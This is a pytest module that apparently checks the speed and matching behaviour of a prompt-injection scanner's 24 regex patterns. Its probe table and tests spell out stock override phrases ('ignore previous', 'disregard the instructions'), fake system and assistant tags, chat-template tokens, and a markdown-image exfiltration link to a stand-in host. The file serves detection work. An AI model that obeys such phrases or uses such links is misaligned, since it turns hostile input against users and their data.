"""Every stage-2 pattern is linear on hostile input (structural-scan-forms US-002).

Five shape families are generated for **every** entry in ``_PATTERNS`` and timed
at 256 KiB and 2 MiB (best of 3). Linear scaling is 8x, quadratic 64x, so the
ratio bound is 12x; a pair that finishes both sizes under 20 ms is fast enough
to prove itself. A second test holds the whole 24-pattern scan of one 2 MiB form
under 2 s in a child process that is killed at a hard deadline, because a
quadratic regex cannot be interrupted from inside the interpreter.

The newline and line-number tests pin the two gap patterns' paragraph-bounded
behaviour and ``_line_number_of``'s unchanged values.

PYTEST_DONT_REWRITE: assertion rewriting is off for this module, so a failing
assert shows only its message, never its operands or call arguments (which
could carry record text). ``tests/test_corpus_lint.py`` requires this marker
in every corpus test module.
"""

from __future__ import annotations

import gc
import multiprocessing
import time
from collections.abc import Callable
from multiprocessing.connection import Connection

import pytest

from models import Stage2Verdict
from pipeline.stage2_structural import _PATTERNS, scan_structural
from scripts.corpus.records import load_corpus
from tests.corpus_stage2 import stage2_forms

_SMALL = 256 * 1024
_LARGE = 2 * 1024 * 1024
_RATIO_BOUND = 12
_FAST_SECONDS = 0.020
_CEILING_SECONDS = 2.0
_HARD_DEADLINE_SECONDS = 60.0

# (name, start token, interior delimiter, probe) in ``_PATTERNS`` order. The
# interior delimiter is the literal a match walks through between the start
# token and the terminator; the probe is one literal that matches.
_SHAPES: tuple[tuple[str, str, str, str], ...] = (
    ("ignore_previous", "ignore", " all ", "ignore previous"),
    ("disregard_instructions", "disregard", " the ", "disregard the instructions"),
    ("new_directive", "new", " ", "new directive"),
    ("system_bracket", "[", "SYSTEM", "[SYSTEM]"),
    ("system_tag", "<", "system", "<system>"),
    ("instructions_banner", "---", "INSTRUCTIONS", "---INSTRUCTIONS---"),
    ("admin_bracket", "[", "admin", "[admin]"),
    ("poppy_bracket", "[", "poppy", "[poppy]"),
    ("assistant_line", "assistant", "\n", "assistant:"),
    ("poppy_line", "POPPY", "\n", "POPPY:"),
    ("system_line", "System", "\n", "System:"),
    ("elevated_user", "user", " with ", "user with elevated"),
    ("base64_run", "A", "+/", "QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZn"),
    ("rot13", "rot", "1", "rot13"),
    ("hex_escape", "\\x41", "\\x", "\\x41\\x42\\x43\\x44"),
    ("system_fence", "```", "`system", "```system"),
    ("instructions_fence", "```", "`instructions", "```instructions"),
    ("im_start", "<|", "im_start", "<|im_start|>"),
    ("endoftext", "<|", "endoftext", "<|endoftext|>"),
    ("data_uri", "data:", "text", "data:text/"),
    ("javascript_scheme", "java", "script", "javascript:"),
    ("private_ip_href", 'href="http://', "10.0.0.", 'href="http://10.0.0.1'),
    ("exfil_image", "![", "](http://a", "![x](https://a.example/{{s}})"),
    ("envelope_breakout", "<", "/retrieved", "</retrieved_content>"),
)

_WHITESPACE = " " + chr(0xA0) + "\t" + chr(0x2003) + " "


def _fill(unit: str, size: int) -> str:
    return (unit * (size // len(unit) + 1))[:size]


def _families(start: str, interior: str, probe: str, size: int) -> dict[str, str]:
    """The five shape families for one pattern at ``size`` characters."""
    return {
        "start_repeated": _fill(start, size),
        "one_start_many_interior": start + _fill(interior, size - len(start)),
        "prefix_then_whitespace": _fill(start + _WHITESPACE * 4096, size),
        "mixed_newlines": _fill(start + "\n \n\n" + interior + "\r\n", size),
        "match_dense": _fill(probe + "\n", size),
    }


def _best_of_three(run: Callable[[], object]) -> float:
    # The collector is paused: a match-dense run allocates a hundred thousand
    # match objects, and generational GC passes over them are not the regex.
    best = float("inf")
    gc.collect()
    gc.disable()
    try:
        for _ in range(3):
            began = time.perf_counter()
            run()
            best = min(best, time.perf_counter() - began)
    finally:
        gc.enable()
    return best


def test_the_table_covers_every_pattern_in_registry_order() -> None:
    assert len(_SHAPES) == len(_PATTERNS) == 24
    for (name, _, _, probe), (_, pattern) in zip(_SHAPES, _PATTERNS, strict=True):
        assert pattern.search(probe), f"{name}: probe does not match its pattern"


@pytest.mark.parametrize(
    "index", range(len(_SHAPES)), ids=[shape[0] for shape in _SHAPES]
)
def test_each_pattern_scales_linearly_on_every_shape_family(index: int) -> None:
    name, start, interior, probe = _SHAPES[index]
    pattern = _PATTERNS[index][1]
    small = _families(start, interior, probe, _SMALL)
    large = _families(start, interior, probe, _LARGE)
    for family, small_text in small.items():
        large_text = large[family]
        t_small = _best_of_three(lambda text=small_text: list(pattern.finditer(text)))
        t_large = _best_of_three(lambda text=large_text: list(pattern.finditer(text)))
        if t_small < _FAST_SECONDS and t_large < _FAST_SECONDS:
            continue
        assert t_large <= _RATIO_BOUND * t_small, (
            f"{name}/{family}: {t_large:.3f}s at 2 MiB vs {t_small:.3f}s at 256 KiB"
        )


def _scan_every_pattern(connection: Connection) -> None:
    """Child process body: seconds per shape family for all 24 patterns."""
    gc.disable()  # the forked heap is the whole suite's; see _best_of_three
    totals: dict[str, float] = {}
    for index, (_, start, interior, probe) in enumerate(_SHAPES):
        pattern = _PATTERNS[index][1]
        for family, text in _families(start, interior, probe, _LARGE).items():
            began = time.perf_counter()
            list(pattern.finditer(text))
            totals[family] = totals.get(family, 0.0) + time.perf_counter() - began
    connection.send(totals)
    connection.close()


def test_all_patterns_finish_one_two_mib_form_within_the_ceiling() -> None:
    context = multiprocessing.get_context("fork")
    receiver, sender = context.Pipe(duplex=False)
    child = context.Process(target=_scan_every_pattern, args=(sender,))
    child.start()
    sender.close()
    try:
        if not receiver.poll(_HARD_DEADLINE_SECONDS):
            pytest.fail("a stage-2 pattern did not finish within the hard deadline")
        totals: dict[str, float] = receiver.recv()
    finally:
        child.terminate()
        child.join()
    assert set(totals) == {
        "start_repeated",
        "one_start_many_interior",
        "prefix_then_whitespace",
        "mixed_newlines",
        "match_dense",
    }
    for family, seconds in totals.items():
        assert seconds <= _CEILING_SECONDS, f"{family}: {seconds:.2f}s for 24 patterns"


def test_match_dense_input_is_linear_through_the_line_number_lookup() -> None:
    dense = {
        size: _fill(
            '<a href="http://10.0.0.1/x">QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZn\n',
            size,
        )
        for size in (_SMALL, _LARGE)
    }
    t_small = _best_of_three(lambda: scan_structural(dense[_SMALL]))
    t_large = _best_of_three(lambda: scan_structural(dense[_LARGE]))
    assert t_large <= _CEILING_SECONDS
    assert t_small < _FAST_SECONDS or t_large <= _RATIO_BOUND * t_small


# ---------------------------------------------------------------------------
# The two gap patterns across a newline
# ---------------------------------------------------------------------------

_SPACED_EXFIL = "![alt text with spaces](https://a.example/{{s}})"


def _split_at_each_space(text: str) -> list[str]:
    return [
        text[:at] + "\n" + text[at + 1 :] for at, ch in enumerate(text) if ch == " "
    ]


@pytest.mark.parametrize(
    "probe",
    ["disregard the instructions", _SPACED_EXFIL],
    ids=["disregard", "exfil_image"],
)
def test_gap_patterns_match_when_split_by_a_newline_at_any_space(probe: str) -> None:
    assert scan_structural(probe).verdict != Stage2Verdict.CLEAN
    splits = _split_at_each_space(probe)
    assert splits
    for split in splits:
        assert scan_structural(split).verdict != Stage2Verdict.CLEAN, repr(split)


def test_disregard_crosses_a_long_same_paragraph_gap() -> None:
    gap = "x" * 10_000
    assert scan_structural(f"disregard {gap}\n{gap} instructions").verdict == (
        Stage2Verdict.BLOCKED
    )


def test_disregard_does_not_cross_a_paragraph_break() -> None:
    result = scan_structural("disregard this note.\n\nThe instructions are below.")
    assert result.verdict == Stage2Verdict.CLEAN


def test_disregard_restarts_at_the_next_start_token() -> None:
    result = scan_structural("disregard disregard instructions")
    assert [f.matched_text for f in result.flags] == ["disregard instructions"]


def test_exfil_alt_text_stops_at_the_first_closing_bracket() -> None:
    # Accepted loss, documented in the spec: a nested ']' ends the alt text.
    assert scan_structural("![a]b](https://a.example/{{s}})").verdict == (
        Stage2Verdict.CLEAN
    )


def test_exfil_alt_text_stops_at_the_next_image_start() -> None:
    # Without this stop, '![![![...' with no ']' is quadratic (10 s at 256 KiB).
    assert scan_structural("![![x](https://a.example/{{s}})").verdict != (
        Stage2Verdict.CLEAN
    )


def test_exfil_url_part_stops_at_the_next_image() -> None:
    text = "![x](https://a.example/ok) ![y](https://a.example/{{s}})"
    spans = [f.matched_text for f in scan_structural(text).flags]
    assert spans == ["![y](https://a.example/{{"]


# ---------------------------------------------------------------------------
# Line numbers
# ---------------------------------------------------------------------------


def _reference_line_numbers(text: str) -> list[tuple[str, str, int]]:
    """The pre-US-002 values: ``text.count`` per match."""
    return [
        (category, match.group(), text.count("\n", 0, match.start()) + 1)
        for category, pattern in _PATTERNS
        for match in pattern.finditer(text)
    ]


def test_line_numbers_equal_the_counting_definition() -> None:
    text = "a\n\nignore previous\r\n" + "x\n" * 5 + "<system>\n\n\n[admin] tail"
    got = [
        (f.category, f.matched_text, f.line_number) for f in scan_structural(text).flags
    ]
    assert got == _reference_line_numbers(text)
    assert got[0][2] == 3


def test_every_corpus_record_keeps_its_line_numbers() -> None:
    wrong: list[str] = []
    for record in load_corpus():
        for index, form in enumerate(stage2_forms(record)):
            got = [
                (f.category, f.matched_text, f.line_number)
                for f in scan_structural(form).flags
            ]
            if got != _reference_line_numbers(form):
                wrong.append(f"{record.id}[{index}]")
    assert wrong == [], "line numbers moved: " + ", ".join(wrong)
